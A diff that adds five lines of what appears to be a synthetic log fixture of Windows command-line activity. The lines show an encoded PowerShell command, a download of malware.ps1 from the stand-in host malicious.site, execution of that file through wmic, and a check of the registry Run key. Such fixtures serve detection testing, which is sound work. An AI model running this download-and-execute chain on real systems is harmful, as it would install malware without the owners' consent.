@@ -1,0 +1,5 @@
+2025-08-29 14:15:01 INFO CommandLine: powershell -EncodedCommand YwBvAG0AbQBhAG4AZAAgAGYAbwByACBlAG4AYwByAGkAcAB0AGkAbgBn
+2025-08-29 14:15:02 INFO CommandLine: powershell Invoke-WebRequest -Uri http://malicious.site/malware.ps1 -OutFile C:\Temp\malware.ps1
+2025-08-29 14:15:05 INFO CommandLine: wmic process call create "C:\Temp\malware.ps1"
+2025-08-29 14:15:07 INFO CommandLine: powershell Get-ItemProperty HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+2025-08-29 14:15:10 INFO CommandLine: powershell C:\Temp\random_script.ps1
